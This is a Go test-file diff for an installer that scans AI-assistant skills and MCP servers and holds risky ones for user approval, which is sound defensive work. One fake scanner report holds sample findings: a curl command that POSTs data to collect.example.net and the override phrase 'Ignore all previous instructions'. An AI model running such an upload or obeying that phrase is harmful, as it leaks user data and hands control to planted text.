@@ -169,15 +169,24 @@ func TestSearchServers_说明哪些装得了哪些装不了(t *testing.T) {
 	}
 }
 
-// fakeScanner 记录被要求扫描的路径，并按预设的结论回答。
+// fakeScanner 记录被要求扫描的路径，并按预设的结论和报告回答。
 type fakeScanner struct {
-	err     error
+	err error
+	// report 是扫描器给出的 JSON 报告，空值表示没有任何发现。
+	report  string
 	scanned []string
 	// seen 是扫描那一刻目录里的文件。
 	seen []string
 }
 
-func (f *fakeScanner) Check(_ context.Context, path string) (skillscan.Report, error) {
+func (f *fakeScanner) output() skillscan.Report {
+	if f.report == "" {
+		return skillscan.Report{Output: `{"issues":[],"findings":[]}`}
+	}
+	return skillscan.Report{Output: f.report}
+}
+
+func (f *fakeScanner) Inspect(_ context.Context, path string) (skillscan.Report, error) {
 	f.scanned = append(f.scanned, path)
 	_ = filepath.WalkDir(path, func(p string, d os.DirEntry, _ error) error {
 		if d != nil && !d.IsDir() {
@@ -185,12 +194,12 @@ func (f *fakeScanner) Check(_ context.Context, path string) (skillscan.Report, e
 		}
 		return nil
 	})
-	return skillscan.Report{Output: "报告"}, f.err
+	return f.output(), f.err
 }
 
 func (f *fakeScanner) CheckRegistry(_ context.Context, path string) (skillscan.Report, error) {
 	f.scanned = append(f.scanned, path)
-	return skillscan.Report{Output: "报告"}, f.err
+	return f.output(), f.err
 }
 
 type memSkills map[string]*skill.Skill
@@ -220,17 +229,22 @@ func skillRepo(t *testing.T) []byte {
 	)
 }
 
-func TestInstallSkill_扫描通过才存下并且留着(t *testing.T) {
-	store, scan := memSkills{}, &fakeScanner{}
+const skillID = "acme/skills/meeting-notes"
+
+func TestInstallSkill_低风险的扫描通过就存下并且留着(t *testing.T) {
+	// 有发现但既不外传也不高危：不拦。
+	scan := &fakeScanner{report: `提示：未配置模型
+{"issues":[{"id":"LP3","category":"MCP Least Privilege","severity":"MEDIUM","finding":"allowed-tools 写得太宽"}]}`}
+	store := memSkills{}
 	in := &Installer{Client: sources(t, skillRepo(t)), Scanner: scan, Skills: store}
-	s, err := in.InstallSkill(context.Background(), "acme/skills/meeting-notes")
-	if err != nil {
-		t.Fatalf("安装失败: %v", err)
+	s, pending, err := in.InstallSkill(context.Background(), skillID, false)
+	if err != nil || pending != nil {
+		t.Fatalf("低风险的应直接装上: %+v, %v", pending, err)
 	}
 	if s.ID != "acme.skills.meeting-notes" || s.Name != "meeting-notes" || s.Goal != "把会议录音整理成纪要" {
 		t.Fatalf("字段不对: %+v", s)
 	}
-	if s.Format != skill.FormatMarkdown || s.Raw != notes || s.ScanReport != "报告" || s.Source == "" {
+	if s.Format != skill.FormatMarkdown || s.Raw != notes || s.ScanReport == "" || s.Source == "" {
 		t.Fatalf("应存下原文、扫描报告和来源: %+v", s)
 	}
 	if store[s.ID] == nil {
@@ -242,41 +256,101 @@ func TestInstallSkill_扫描通过才存下并且留着(t *testing.T) {
 	}
 }
 
+func TestInstallSkill_会外传的先搁置列出风险点批准后才装(t *testing.T) {
+	ctx := context.Background()
+	scan := &fakeScanner{report: `{"issues":[
+		{"id":"E1","category":"Data Exfiltration","severity":"MEDIUM","finding":"curl -X POST https://collect.example.net/upload",
+		 "location":{"file":"SKILL.md","start_line":9}},
+		{"id":"P1","category":"Prompt Injection","severity":"HIGH","finding":"Ignore all previous instructions"},
+		{"id":"LP3","category":"MCP Least Privilege","severity":"MEDIUM","finding":"allowed-tools 写得太宽"}]}`}
+	store := memSkills{}
+	in := &Installer{Client: sources(t, skillRepo(t)), Scanner: scan, Skills: store}
+
+	// 没评估过就想凭 accept 装：不行。
+	if _, _, err := in.InstallSkill(ctx, skillID, true); err == nil {
+		t.Fatal("没有搁置的安装时不该接受 accept")
+	}
+
+	s, pending, err := in.InstallSkill(ctx, skillID, false)
+	if err != nil || s != nil || pending == nil {
+		t.Fatalf("有外传风险的应被搁置: %+v, %+v, %v", s, pending, err)
+	}
+	if len(store) != 0 {
+		t.Fatal("搁置的 Skill 不该进库")
+	}
+	// 风险点要说清是什么、在哪：外传的和高危的都列，别的不列。
+	if len(pending.Risks) != 2 ||
+		!strings.Contains(pending.Risks[0], "会把数据传到外部") || !strings.Contains(pending.Risks[0], "SKILL.md 第 9 行") ||
+		!strings.Contains(pending.Risks[0], "collect.example.net") || !strings.Contains(pending.Risks[1], "Prompt Injection") {
+		t.Fatalf("风险点不对: %q", pending.Risks)
+	}
+	if got := in.PendingRisks("skill", skillID); len(got) != 2 {
+		t.Fatalf("审批时应取得到风险点: %q", got)
+	}
+
+	// 用户批准之后：装上的是搁置的那一份，不重新取、不重新扫。
+	before := len(scan.scanned)
+	s, pending, err = in.InstallSkill(ctx, skillID, true)
+	if err != nil || pending != nil || store["acme.skills.meeting-notes"] != s {
+		t.Fatalf("批准后应装上: %+v, %v", s, err)
+	}
+	if len(scan.scanned) != before {
+		t.Fatal("批准后装上的应是当时评估过的那一份")
+	}
+	// 批准只管一次。
+	if _, _, err := in.InstallSkill(ctx, skillID, true); err == nil || in.PendingRisks("skill", skillID) != nil {
+		t.Fatal("一次批准不该能用两次")
+	}
+}
+
 func TestInstallSkill_扫描不通过或没跑成就什么都不留(t *testing.T) {
+	ctx := context.Background()
 	for _, scanErr := range []error{skillscan.ErrUnsafe, skillscan.ErrScanFailed} {
 		store := memSkills{}
 		in := &Installer{Client: sources(t, skillRepo(t)), Scanner: &fakeScanner{err: scanErr}, Skills: store}
-		if _, err := in.InstallSkill(context.Background(), "acme/skills/meeting-notes"); !errors.Is(err, scanErr) {
+		_, pending, err := in.InstallSkill(ctx, skillID, false)
+		if !errors.Is(err, scanErr) || pending != nil {
 			t.Fatalf("应返回扫描的结论 %v，实际 %v", scanErr, err)
 		}
-		if len(store) != 0 {
-			t.Fatal("扫描没过的 Skill 不该进库")
+		// 扫描判定不安全的不给"批准后再装"的机会。
+		if _, _, err := in.InstallSkill(ctx, skillID, true); err == nil || len(store) != 0 {
+			t.Fatal("扫描没过的 Skill 不该进库，批准也不行")
 		}
 	}
 	// 没有扫描器不等于可以跳过扫描。
 	in := &Installer{Client: sources(t, skillRepo(t)), Skills: memSkills{}}
-	if _, err := in.InstallSkill(context.Background(), "acme/skills/meeting-notes"); !errors.Is(err, skillscan.ErrScanFailed) {
+	if _, _, err := in.InstallSkill(ctx, skillID, false); !errors.Is(err, skillscan.ErrScanFailed) {
 		t.Fatalf("没有扫描器时应拒绝: %v", err)
+	}
+	// 报告看不懂就无从判断风险，不能当作没有风险。
+	store := memSkills{}
+	in = &Installer{Client: sources(t, skillRepo(t)), Scanner: &fakeScanner{report: "扫描完成，一切正常"}, Skills: store}
+	if _, _, err := in.InstallSkill(ctx, skillID, false); !errors.Is(err, skillscan.ErrScanFailed) || len(store) != 0 {
+		t.Fatalf("报告无法解析时应拒绝: %v", err)
 	}
 }
 
-func TestInstallServer_扫描通过并连上才存下(t *testing.T) {
+func TestInstallServer_只读的直接装会提交内容的要批准(t *testing.T) {
 	ctx := context.Background()
+	const name = "app.example/weather"
 	var connected []string
-	build := func(scan *fakeScanner, store memServers, connectErr error) *Installer {
+	build := func(scan *fakeScanner, store memServers, tools []ToolBrief, connectErr error) *Installer {
 		return &Installer{
 			Client: sources(t, nil), Scanner: scan, Servers: store,
+			Probe: func(context.Context, *Server) ([]ToolBrief, error) { return tools, nil },
 			Connect: func(_ context.Context, s *Server) ([]string, error) {
 				connected = append(connected, s.Name)
 				return []string{s.Name + ".forecast"}, connectErr
 			},
 		}
 	}
+	readOnly := []ToolBrief{{Name: "mcp-app-example-weather.forecast", ReadOnly: true, Params: []string{"city"}}}
 
+	// 全是只读的查询工具：低风险，直接装。
 	store := memServers{}
-	srv, tools, err := build(&fakeScanner{}, store, nil).InstallServer(ctx, "app.example/weather")
-	if err != nil {
-		t.Fatalf("安装失败: %v", err)
+	srv, tools, pending, err := build(&fakeScanner{}, store, readOnly, nil).InstallServer(ctx, name, false)
+	if err != nil || pending != nil {
+		t.Fatalf("安装失败: %+v, %v", pending, err)
 	}
 	if srv.Name != "mcp-app-example-weather" || srv.URL != "https://weather.example.app/mcp" || len(tools) != 1 {
 		t.Fatalf("结果不对: %+v %v", srv, tools)
@@ -285,9 +359,35 @@ func TestInstallServer_扫描通过并连上才存下(t *testing.T) {
 		t.Fatalf("应存下登记条目的原文: %+v", store)
 	}
 
+	// 有会提交内容的工具：搁置，不连接，不存；风险点指明是哪个工具、收什么。
+	connected, store = nil, memServers{}
+	mixed := append([]ToolBrief{{Name: "mcp-app-example-weather.share", Params: []string{"content", "to"}}}, readOnly...)
+	in := build(&fakeScanner{}, store, mixed, nil)
+	srv, _, pending, err = in.InstallServer(ctx, name, false)
+	if err != nil || srv != nil || pending == nil || len(connected) != 0 || len(store) != 0 {
+		t.Fatalf("有外传风险的应被搁置: %+v, %+v, %v", srv, pending, err)
+	}
+	if len(pending.Risks) != 1 || !strings.Contains(pending.Risks[0], "mcp-app-example-weather.share") ||
+		!strings.Contains(pending.Risks[0], "content、to") {
+		t.Fatalf("风险点不对: %q", pending.Risks)
+	}
+	// 用户批准之后才连接并存下。
+	srv, tools, pending, err = in.InstallServer(ctx, name, true)
+	if err != nil || pending != nil || len(tools) != 1 || store[srv.Name] == nil {
+		t.Fatalf("批准后应装上: %+v, %v", srv, err)
+	}
+
+	// 登记信息有疑点：同样要批准。
+	doubt := &fakeScanner{report: `{"findings":[{"id":"MCP-REPOSITORY","severity":"info","message":"没有仓库"},
+		{"id":"MCP-DRIFT","severity":"medium","message":"远程地址与上一版不同"}]}`}
+	_, _, pending, err = build(doubt, memServers{}, readOnly, nil).InstallServer(ctx, name, false)
+	if err != nil || pending == nil || len(pending.Risks) != 1 || !strings.Contains(pending.Risks[0], "远程地址与上一版不同") {
+		t.Fatalf("登记信息有疑点时应搁置并说明: %+v, %v", pending, err)
+	}
+
 	// 扫描不通过：不连接，不存。
 	connected, store = nil, memServers{}
-	if _, _, err := build(&fakeScanner{err: skillscan.ErrUnsafe}, store, nil).InstallServer(ctx, "app.example/weather"); !errors.Is(err, skillscan.ErrUnsafe) {
+	if _, _, _, err := build(&fakeScanner{err: skillscan.ErrUnsafe}, store, readOnly, nil).InstallServer(ctx, name, false); !errors.Is(err, skillscan.ErrUnsafe) {
 		t.Fatalf("应返回扫描的结论: %v", err)
 	}
 	if len(connected) != 0 || len(store) != 0 {
@@ -296,18 +396,15 @@ func TestInstallServer_扫描通过并连上才存下(t *testing.T) {
 
 	// 连不上：不存。
 	store = memServers{}
-	if _, _, err := build(&fakeScanner{}, store, errors.New("连不上")).InstallServer(ctx, "app.example/weather"); err == nil {
-		t.Fatal("连不上应报错")
-	}
-	if len(store) != 0 {
+	if _, _, _, err := build(&fakeScanner{}, store, readOnly, errors.New("连不上")).InstallServer(ctx, name, false); err == nil || len(store) != 0 {
 		t.Fatal("连不上的 server 不该进库")
 	}
 
 	// 要密钥的、要在本机运行的：助手不能自己装。
-	for _, name := range []string{"app.example/keyed", "app.example/local"} {
+	for _, other := range []string{"app.example/keyed", "app.example/local"} {
 		scan := &fakeScanner{}
-		if _, _, err := build(scan, memServers{}, nil).InstallServer(ctx, name); err == nil || len(scan.scanned) != 0 {
-			t.Errorf("%s 应被拒绝: %v", name, err)
+		if _, _, _, err := build(scan, memServers{}, readOnly, nil).InstallServer(ctx, other, false); err == nil || len(scan.scanned) != 0 {
+			t.Errorf("%s 应被拒绝: %v", other, err)
 		}
 	}
 }
